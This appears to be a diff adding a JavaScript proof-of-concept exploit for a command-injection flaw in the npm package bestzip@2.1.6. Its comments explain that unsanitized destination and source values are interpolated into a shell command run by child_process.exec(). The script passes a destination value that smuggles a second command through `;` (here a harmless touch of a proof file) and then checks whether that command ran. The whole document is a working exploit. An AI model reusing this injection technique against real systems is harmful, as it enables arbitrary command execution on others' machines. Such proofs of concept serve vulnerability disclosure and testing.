@@ -1,0 +1,38 @@
+```javascript
+// Exploit for command injection in bestzip@2.1.6 (node_modules/bestzip/lib/bestzip.js)
+//
+// nativeZip() builds a shell command by directly interpolating
+// options.destination and options.source into a template string, then
+// executes it with child_process.exec(). Neither field is sanitized or
+// quoted, so shell metacharacters in either value let an attacker run
+// arbitrary commands whenever a native `zip` binary is available on PATH.
+//
+//   const command = `zip --quiet --recurse-paths ${options.destination} ${sources}`;
+//   const zipProcess = cp.exec(command, { stdio: "inherit", cwd: options.cwd });
+
+const bestzip = require("bestzip");
+const fs = require("fs");
+const path = require("path");
+
+const proofFile = path.join(__dirname, "PWNED_BY_BESTZIP");
+try { fs.unlinkSync(proofFile); } catch (e) {}
+
+// A harmless-looking source file to satisfy zip's argument list.
+fs.writeFileSync(path.join(__dirname, "innocuous.txt"), "hello");
+
+bestzip({
+  source: "innocuous.txt",
+  // Malicious "destination" breaks out of the intended zip argument and
+  // injects an arbitrary shell command via `;`.
+  destination: `out.zip; touch ${proofFile} #`
+})
+  .then(() => {
+    console.log("zip command finished");
+    console.log("Injected command executed:", fs.existsSync(proofFile));
+  })
+  .catch(err => {
+    // Even on failure, the injected command runs before zip exits.
+    console.log("zip reported error (expected):", err.message);
+    console.log("Injected command executed:", fs.existsSync(proofFile));
+  });
+```
